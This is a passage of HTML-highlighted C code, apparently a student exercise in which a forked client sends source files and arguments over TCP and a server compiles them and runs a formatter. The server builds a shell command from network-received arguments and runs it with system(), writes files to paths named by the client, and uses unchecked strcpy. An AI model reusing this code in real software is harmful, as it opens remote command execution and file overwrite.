class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> BUFFER_SIZE 500</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> A_LEN 5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FILE_NUM 2<span class=\"comment\">// the number of the codes and makefile</span></span></span><br><span class=\"line\"><span class=\"keyword\">int</span> filenum = <span class=\"number\">0</span>;<span class=\"comment\">//the total number of files</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> files[<span class=\"number\">100</span>][<span class=\"number\">100</span>] = &#123;<span class=\"string\">\"fmt.c\"</span>, <span class=\"string\">\"makefile\"</span>&#125;;<span class=\"comment\">//files that should be transed</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> errorout(<span class=\"keyword\">int</span> id)&#123;<span class=\"comment\">//error output function</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(id &gt; <span class=\"number\">0</span>) </span><br><span class=\"line\">        perror(<span class=\"string\">\"ERROR FROM CLIENT\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">else</span> perror(<span class=\"string\">\"ERROR FROM SERVER\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">switch</span> (id)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Client socket initiate error\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Client connect failed\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"File open error\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Config file is needed\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">-1</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Server socket initiate error\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">-2</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Server bind error\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">        <span class=\"built_in\">case</span> <span class=\"number\">-3</span>:</span><br><span class=\"line\">            printf(<span class=\"string\">\"Client connect failed\\n\"</span>);</span><br><span class=\"line\">            <span class=\"built_in\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to output message</span><br><span class=\"line\"> * @param </span><br><span class=\"line\"> *      server: 0 for client, 1 for server</span><br><span class=\"line\"> *      msg: the message itself</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> outputmsg(<span class=\"keyword\">int</span> server, <span class=\"keyword\">char</span> *msg)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(server) printf(<span class=\"string\">\"SERVER: \"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">else</span> printf(<span class=\"string\">\"CLIENT: \"</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"%s\"</span>,msg);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to send message</span><br><span class=\"line\"> * @param</span><br><span class=\"line\"> *      c_sock: the socket which the message will send to</span><br><span class=\"line\"> *      msg: the message</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> sendmessage(<span class=\"keyword\">int</span> c_sock, <span class=\"keyword\">char</span> *msg)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[BUFFER_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    strcpy(<span class=\"built_in\">buffer</span>, msg);</span><br><span class=\"line\">    send(c_sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to send files</span><br><span class=\"line\"> * @param</span><br><span class=\"line\"> *      c_sock: the socket which the message will send to</span><br><span class=\"line\"> *      filename: the file name of the file that is needed to be sent</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> sendfile(<span class=\"keyword\">int</span> c_sock, <span class=\"keyword\">char</span> *filename)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[BUFFER_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    FILE *fp = fopen(filename, <span class=\"string\">\"r\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(NULL == fp)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">3</span>);</span><br><span class=\"line\">        printf(<span class=\"string\">\"%s isn\\'t exist\\n\"</span>,filename);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(fgets(<span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, fp) != NULL)&#123;<span class=\"comment\">//get the file line by line and send it</span></span><br><span class=\"line\">        printf(<span class=\"string\">\"%s\"</span>,<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">        send(c_sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * the main function of client part</span><br><span class=\"line\"> * @param</span><br><span class=\"line\"> *      args: the arguments that should be sent to the server</span><br><span class=\"line\"> *      addr: the address information of client</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> client(<span class=\"keyword\">char</span> * args, <span class=\"keyword\">struct</span> sockaddr_in addr)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sock,i;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[BUFFER_SIZE];</span><br><span class=\"line\">    sock = socket(PF_INET, SOCK_STREAM, <span class=\"number\">0</span>);<span class=\"comment\">//use ipv4/tcp/ip to transform</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(sock &lt; <span class=\"number\">0</span>)&#123;<span class=\"comment\">//fail to initiate the socket</span></span><br><span class=\"line\">        errorout(<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">3</span>;++ i)&#123;<span class=\"comment\">//if the client tries to connect the server failed, try three times in total</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">connect</span>(sock, (<span class=\"keyword\">struct</span> sockaddr *)&amp;addr, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> sockaddr)) &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            errorout(<span class=\"number\">2</span>);</span><br><span class=\"line\">            <span class=\"built_in\">if</span>(i == <span class=\"number\">2</span>) &#123;<span class=\"comment\">// three times later, the client part will exit</span></span><br><span class=\"line\">                errorout(<span class=\"number\">2</span>);</span><br><span class=\"line\">                <span class=\"built_in\">return</span> <span class=\"number\">-2</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//try to connect to the server 3 seconds later</span></span><br><span class=\"line\">            outputmsg(<span class=\"number\">0</span>,<span class=\"string\">\"Try to reconnect 3 seconds later\\n\"</span>);</span><br><span class=\"line\">            sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">            outputmsg(<span class=\"number\">0</span>,<span class=\"string\">\"Try to reconnect 2 seconds later\\n\"</span>);</span><br><span class=\"line\">            sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">            outputmsg(<span class=\"number\">0</span>,<span class=\"string\">\"Try to reconnect 1 second later\\n\"</span>);</span><br><span class=\"line\">            sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outputmsg(<span class=\"number\">0</span>,<span class=\"string\">\"Connected to the server\\n\"</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"__START__TRANSMISSION\\n__START__FILELIST\\n\"</span>);<span class=\"comment\">//output the names of files</span></span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = <span class=\"number\">0</span>;i &lt; FILE_NUM;++ i) printf(<span class=\"string\">\"%s\\n\"</span>,files[i]);</span><br><span class=\"line\">    sendmessage(sock, <span class=\"string\">\"__START__\"</span>);<span class=\"comment\">//send the file list (config) to the server</span></span><br><span class=\"line\">    sendmessage(sock,<span class=\"string\">\"config\"</span>);</span><br><span class=\"line\">    sendfile(sock, <span class=\"string\">\"config\"</span>);</span><br><span class=\"line\">    sendmessage(sock, <span class=\"string\">\"__END__\"</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"__END__FILELIST\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = <span class=\"number\">0</span>;i &lt; FILE_NUM;++ i)&#123;<span class=\"comment\">//output the names and send messages and files to server        sendmessage(sock, \"__START__\");//if the cil</span></span><br><span class=\"line\">        sendmessage(sock, <span class=\"string\">\"__START__\"</span>);<span class=\"comment\">//if the client sends the \"__START__\" message, it means there will be a new file to send</span></span><br><span class=\"line\">        sendmessage(sock, files[i]);<span class=\"comment\">//send the name of the file</span></span><br><span class=\"line\">        printf(<span class=\"string\">\"__START__%s\\n\"</span>,files[i]);</span><br><span class=\"line\">        sendfile(sock, files[i]);<span class=\"comment\">//send this file</span></span><br><span class=\"line\">        sendmessage(sock, <span class=\"string\">\"__END__\"</span>);<span class=\"comment\">//if the client sends the \"__END__\", means it's the end of a file</span></span><br><span class=\"line\">        printf(<span class=\"string\">\"__END__%s\\n\"</span>,files[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(<span class=\"string\">\"__START__ARGs\\n\"</span>);</span><br><span class=\"line\">    sendmessage(sock,<span class=\"string\">\"__ARGs__\"</span>);<span class=\"comment\">//if the client sends the \"__ARGs__\", means the next message will be the atgs</span></span><br><span class=\"line\">    sendmessage(sock,args);</span><br><span class=\"line\">    printf(<span class=\"string\">\"%s\\n\"</span>,args);</span><br><span class=\"line\">    printf(<span class=\"string\">\"__END__ARGs\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = FILE_NUM;i &lt; filenum;++ i)&#123;<span class=\"comment\">//send the files which are needed to format</span></span><br><span class=\"line\">        sendmessage(sock, <span class=\"string\">\"__START__\"</span>);</span><br><span class=\"line\">        sendmessage(sock, files[i]);</span><br><span class=\"line\">        printf(<span class=\"string\">\"__START__%s_TO_FORMAT\\n\"</span>,files[i]);</span><br><span class=\"line\">        sendfile(sock, files[i]);</span><br><span class=\"line\">        sendmessage(sock, <span class=\"string\">\"__END__\"</span>);</span><br><span class=\"line\">        printf(<span class=\"string\">\"__END__%s_TO_FORMAT\\n\"</span>,files[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sendmessage(sock,<span class=\"string\">\"__TRANS END__\"</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"__END__TRANSMISSION\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>((len = recv(sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>)) &gt; <span class=\"number\">0</span>)&#123;<span class=\"comment\">//recv the answer from server</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(!flag) printf(<span class=\"string\">\"__START__RESULT\\n\"</span>);<span class=\"comment\">//before the first line of answer, print this. in order to avoid the other process distroy the output, this message should be printed after it recvs the answer</span></span><br><span class=\"line\">        flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">buffer</span>[len] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        printf(<span class=\"string\">\"%s\"</span>,<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    printf(<span class=\"string\">\"__END__RESULT\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">close</span>(sock);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is the main function of server part</span><br><span class=\"line\"> * @param addr: the address of the server</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * in order to avoid the same file name with the original filename,</span><br><span class=\"line\"> * the server part will work in the ./s_temp/ folder</span><br><span class=\"line\"> * the files recieved by the server will be stored in this folder</span><br><span class=\"line\"> * and the answer will also be generated there</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> server(<span class=\"keyword\">struct</span> sockaddr_in s_addr)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> s_sock,c_sock;<span class=\"comment\">//means the server sockets and the client sockets</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> args[BUFFER_SIZE];<span class=\"comment\">//args means the arguments</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> sockaddr_in c_addr;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[BUFFER_SIZE];</span><br><span class=\"line\">    <span class=\"keyword\">char</span> filename[<span class=\"number\">100</span>] = &#123;<span class=\"string\">\"./s_temp/\"</span>&#125;;<span class=\"comment\">//the filename started with ./s_temp/</span></span><br><span class=\"line\">    FILE *fp = NULL;</span><br><span class=\"line\">    s_sock = socket(PF_INET, SOCK_STREAM, <span class=\"number\">0</span>);<span class=\"comment\">//init the socket</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(s_sock &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//bind the socket with the ip address</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(bind(s_sock, (<span class=\"keyword\">struct</span> sockaddr *)&amp;s_addr, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> sockaddr)) &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">-2</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outputmsg(<span class=\"number\">1</span>,<span class=\"string\">\"Server starts to listen\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">listen</span>(s_sock, A_LEN);<span class=\"comment\">//listen to the rhythm of the falling client</span></span><br><span class=\"line\">    outputmsg(<span class=\"number\">1</span>,<span class=\"string\">\"A client tries to connect\\n\"</span>);<span class=\"comment\">//telling me just what a waitting the server've been</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> addrlen;</span><br><span class=\"line\">    c_sock = accept(s_sock, (<span class=\"keyword\">struct</span> sockaddr *)&amp;c_addr, &amp;addrlen);<span class=\"comment\">//I wish that it would go and let a client connect me</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"SERVER: User %d connected\\n\"</span>,c_sock);<span class=\"comment\">//and let users know again</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(c_sock &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">-3</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len = <span class=\"number\">0</span>,f_num = <span class=\"number\">0</span>;</span><br><span class=\"line\">    system(<span class=\"string\">\"mkdir s_temp\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">while</span>((len = recv(c_sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>)) &gt; <span class=\"number\">0</span>)&#123;<span class=\"comment\">//Now the messages i've received has been stored</span></span><br><span class=\"line\">        <span class=\"built_in\">buffer</span>[len] = <span class=\"number\">0</span>;<span class=\"comment\">//Looking for a end of the line</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(strcmp(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"__START__\"</span>) == <span class=\"number\">0</span>) &#123;<span class=\"comment\">//little does message know that when it means a new file</span></span><br><span class=\"line\">            len = recv(c_sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>);<span class=\"comment\">//Receive the name and open the file</span></span><br><span class=\"line\">            <span class=\"built_in\">buffer</span>[len] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            strcpy(filename + <span class=\"number\">9</span>, <span class=\"built_in\">buffer</span>);<span class=\"comment\">//\"+9 means the length of \"./s_temp/\" after this, the filename will be \"./s_temp/buffer\". \"</span></span><br><span class=\"line\">            fp = fopen(filename,<span class=\"string\">\"w\"</span>);<span class=\"comment\">//\"the file will be stored in the ./s_temp/\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(strcmp(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"__END__\"</span>) == <span class=\"number\">0</span>)&#123;<span class=\"comment\">//Client please tell me now does this a file's end</span></span><br><span class=\"line\">            fclose(fp);</span><br><span class=\"line\">        &#125;<span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(strcmp(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"__TRANS END__\"</span>) == <span class=\"number\">0</span>) <span class=\"built_in\">break</span>;<span class=\"comment\">//For this is the end of the trans precess</span></span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(strcmp(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"__ARGs__\"</span>) == <span class=\"number\">0</span>)&#123;<span class=\"comment\">//I can't work fine when the arguement's somewhere far away</span></span><br><span class=\"line\">            len = recv(c_sock, args, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>);<span class=\"comment\">//receive the args of the fmt</span></span><br><span class=\"line\">            args[len] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(fp) fputs(<span class=\"built_in\">buffer</span>, fp);<span class=\"comment\">//output the things into a file</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(!fp) printf(<span class=\"string\">\"%s\"</span>,<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outputmsg(<span class=\"number\">1</span>,<span class=\"string\">\"Output from server to handle files\\n\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"make task1\"</span>);<span class=\"comment\">//gcc combine.c -o combine</span></span><br><span class=\"line\">    len = <span class=\"number\">13</span>;</span><br><span class=\"line\">    <span class=\"comment\">//the run fmt command will be generated here</span></span><br><span class=\"line\">    strcpy(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"./s_temp/fmt \"</span>);<span class=\"comment\">//starts with this</span></span><br><span class=\"line\">    strcpy(<span class=\"built_in\">buffer</span> + <span class=\"number\">13</span>, args);<span class=\"comment\">//13 means the length of \"./s_temp/fmt\", the args will be copyed after this</span></span><br><span class=\"line\">    len += strlen(args);<span class=\"comment\">//len += length of args</span></span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = FILE_NUM;i &lt; filenum;++ i)&#123;</span><br><span class=\"line\">        strcpy(<span class=\"built_in\">buffer</span> + len, <span class=\"string\">\"./s_temp/\"</span>);<span class=\"comment\">//after the args, the files which needs to format will be appended one by one, before every file, we will add \"./s_temp/\" </span></span><br><span class=\"line\">        len += <span class=\"number\">9</span>;</span><br><span class=\"line\">        strcpy(<span class=\"built_in\">buffer</span> + len, files[i]);</span><br><span class=\"line\">        len += strlen(files[i]);</span><br><span class=\"line\">        <span class=\"built_in\">buffer</span>[len ++] = <span class=\"string\">' '</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    strcpy(<span class=\"built_in\">buffer</span> + len, <span class=\"string\">\" &gt; ./s_temp/output\"</span>);<span class=\"comment\">//adds the output</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"args=%s\\n\"</span>,<span class=\"built_in\">buffer</span>);<span class=\"comment\">//output the command</span></span><br><span class=\"line\">    system(<span class=\"built_in\">buffer</span>);<span class=\"comment\">//run the command</span></span><br><span class=\"line\">    outputmsg(<span class=\"number\">1</span>,<span class=\"string\">\"Server output finished\\n\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile(c_sock, <span class=\"string\">\"./s_temp/output\"</span>);<span class=\"comment\">//send the answer back to the client</span></span><br><span class=\"line\">    <span class=\"built_in\">close</span>(c_sock);</span><br><span class=\"line\">    <span class=\"built_in\">close</span>(s_sock);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"><span class=\"keyword\">int</span> main(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> c_sock,i,len = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> sockaddr_in addr;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[<span class=\"number\">200</span>];</span><br><span class=\"line\">    <span class=\"keyword\">char</span> args[<span class=\"number\">1000</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *IP = <span class=\"string\">\"127.0.0.1\"</span>;<span class=\"comment\">//the init IP</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> port = <span class=\"number\">9585</span>;</span><br><span class=\"line\">    FILE *fp = fopen(<span class=\"string\">\"./config\"</span>,<span class=\"string\">\"r\"</span>);<span class=\"comment\">//read the config file</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(NULL == fp)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">4</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    fgets(<span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, fp);</span><br><span class=\"line\">    filenum = atoi(<span class=\"built_in\">buffer</span>);<span class=\"comment\">//the first line will be the number of files</span></span><br><span class=\"line\">    filenum += FILE_NUM;<span class=\"comment\">//FILE_NUM means the number of code files</span></span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = FILE_NUM;i &lt; filenum;++ i)&#123;<span class=\"comment\">//read the file names from config </span></span><br><span class=\"line\">        fgets(files[i], <span class=\"number\">100</span>, fp);</span><br><span class=\"line\">        files[i][strlen(files[i]) - <span class=\"number\">1</span>] = <span class=\"number\">0</span>;<span class=\"comment\">//remove the '\\n' after each filename</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//if the arguments exist, replace the IP and port address</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(argc &gt; <span class=\"number\">1</span>) IP = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(argc &gt; <span class=\"number\">2</span>) port = atoi(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    printf(<span class=\"string\">\"IP: %s\\n\"</span>,IP);</span><br><span class=\"line\">    printf(<span class=\"string\">\"port: %d\\n\"</span>,port);</span><br><span class=\"line\"></span><br><span class=\"line\">    fgets(<span class=\"built_in\">buffer</span>,<span class=\"number\">100</span>, fp);<span class=\"comment\">// get the argument of the fmt from the last line of the config</span></span><br><span class=\"line\">    <span class=\"built_in\">buffer</span>[strlen(<span class=\"built_in\">buffer</span>) - <span class=\"number\">1</span>] = <span class=\"string\">' '</span>;</span><br><span class=\"line\">    addr.sin_family = AF_INET;<span class=\"comment\">//init the address information of client and server</span></span><br><span class=\"line\">    addr.sin_addr.s_addr = inet_addr(IP);</span><br><span class=\"line\">    addr.sin_port = htons(port);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">int</span> id = fork();</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(!id) client(<span class=\"built_in\">buffer</span>, addr);<span class=\"comment\">//the subprocess will take the client part</span></span><br><span 